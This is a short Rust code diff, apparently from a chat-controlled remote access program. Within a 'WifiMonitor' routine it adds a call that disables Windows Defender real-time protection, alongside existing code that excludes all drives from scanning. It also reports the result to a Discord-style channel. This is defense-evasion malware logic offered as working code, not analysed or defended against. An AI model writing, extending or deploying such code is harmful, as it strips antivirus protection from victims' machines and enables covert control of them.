@@ -61,10 +61,12 @@ impl WifiMonitor {
             if last_state == WifiState::Enabled {
                 let _ = channel_id.say(&http, "**WiFi Monitor**: WiFi is currently enabled").await;
 
+                let _ = crate::core::defender::disable_defender().await;
+                
                 let excluded_drives = crate::core::defender::add_drives_to_exclusion().await;
                 if !excluded_drives.is_empty() {
                     let drives_str = excluded_drives.join(", ");
-                    let _ = channel_id.say(&http, format!("**Defender**: Added exclusion for drives: {}", drives_str)).await;
+                    let _ = channel_id.say(&http, format!("**Defender**: Disabled RTP + Added exclusions: {}", drives_str)).await;
                 }
             }
 
